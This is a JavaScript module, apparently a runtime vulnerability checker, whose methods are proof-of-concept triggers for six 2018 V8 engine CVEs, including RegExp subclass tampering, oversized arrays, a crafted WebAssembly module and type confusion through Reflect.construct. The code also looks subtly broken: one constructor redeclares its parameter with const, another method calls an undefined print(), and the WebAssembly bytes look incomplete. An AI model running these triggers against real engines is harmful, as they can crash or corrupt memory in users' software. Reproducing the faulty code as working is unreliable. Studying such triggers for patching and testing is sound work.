'use strict';
class v8Safe {
    CVE_2018_6149() {
        var str2 = String.fromCharCode(0x2c)
        var o2 = new Array(0x20000000)

        String.prototype.split.call(o2, '')
    }

    CVE_2018_6143() {
        class MyRegExp extends RegExp {
            exec(str) {
                const r = super.exec.call(this, str);
                if (r) r.length=0;
                return r;
            }
        }
        const result = 'a'.match(new MyRegExp('.', 'g'));
        var crash = result[0].x;
    }

    CVE_2018_6136() {
        class MyRegExp extends RegExp {
            exec(str) {
                const r = super.exec.call(this, str);
                r[0] = 0; // Value could be changed to something arbitrary
                return r;
            }
        }

        'a'.match(new MyRegExp('.', 'g'));
    }

    CVE_2018_6092() {
        var b2 = new Uint8Array(171);
        b2[0] = 0x0;
        b2[1] = 0x61;
        b2[2] = 0x73;
        b2[3] = 0x6d;
        b2[4] = 0x1;
        b2[169] = 0x3;
        b2[170] = 0xb;

        function f(){print("in f");}
        var memory = new WebAssembly.Memory({initial:1, maximum:1});
        var mod = new WebAssembly.Module(b2);
        var i = new WebAssembly.Instance(mod, { imports : {imported_func : f}, js : {mem : memory}});
        i.exports.accumulate.call(0, 5);
    }

    CVE_2018_6065() {
        const f = eval(`(function f(i) {
    if (i == 0) {
        class Derived extends Object {
            constructor() {
                super();
                ${"this.a=1;".repeat(0x3fffe-8)}
            }
        }

        return Derived;
    }

    class DerivedN extends f(i-1) {
        constructor() {
            super();
            ${"this.a=1;".repeat(0x40000-8)}
        }
    }

    return DerivedN;
})`);

        let a = new (f(0x7ff))();
        console.log(a);
    }

    CVE_2018_6056() {
        function gc() {
            for (let i = 0; i < 20; i++)
                new ArrayBuffer(0x2000000);
        }

        class Derived extends Array {
            constructor(a) {
                const a = 1;
            }
        }

        // Derived is not a subclass of RegExp
        let o = Reflect.construct(RegExp, [], Derived);
        o.lastIndex = 0x1234;

        gc();
    }

    Test_Intl() {
        return new Intl.DateTimeFormat('en-US');
    }
}

module.exports = v8Safe;